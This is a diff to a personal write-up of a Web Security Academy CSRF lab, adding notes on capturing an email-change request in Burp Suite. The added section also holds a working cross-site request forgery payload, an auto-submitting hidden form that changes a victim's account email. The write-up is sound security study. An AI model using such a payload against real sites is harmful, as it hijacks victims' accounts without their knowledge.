@@ -85,6 +85,30 @@ Seds a POST request to ```view-source:https://0a3500ce033f86a480602b28006400dd.w
 
 Lets attempt to change the email from ```wiener@normal-user.net``` to ```wiener2@normal-user.net``` and capture the request in burp suite.
 ![Email_Change_1](Email_Change1.png)
-It seems to use the session ID in a cookie
+It seems to use the session ID stored in a cookie
+
+
+# Web exploitation of update email function through CSRF
+⚠️Session ID may vary due to connection issues and needing to restart lab during this process.
+
+In the body of our exploit server we can insert the following:
+```
+<form action="https://0a1000f60481354e8075944c0074006c.web-security-academy.net/my-account/change-email" method="POST">
+	<input type="hidden" name="email" value="wiener3@normal-user.net" />
+</form>
+<script>
+	document.forms[0].submit();
+</script>
+```
+Explanation:
+>Send the data to the destination stored in the attribute action. Which in this case is https://0a1000f60481354e8075944c0074006c.web-security-academy.net/my-account/change-email. Which we got from our recon. Using type hidden because we don't want the victim to see this input field. Copy and paste ```name="email" value=""``` from the original form and insert the email we want our account to change to in value.
+
+Use ```document.form[0].submit()``` to execute the form when our exploit server is loaded by the victim/target. 
+
+Explanation
+>Does this by using javascript and accessing the document object and use the form[index] 0 which would be our malicious form and submit it.
+
+Select store to save it on the exploit server.
+![Insert malicious form](Malicious_Body.png)
 
 
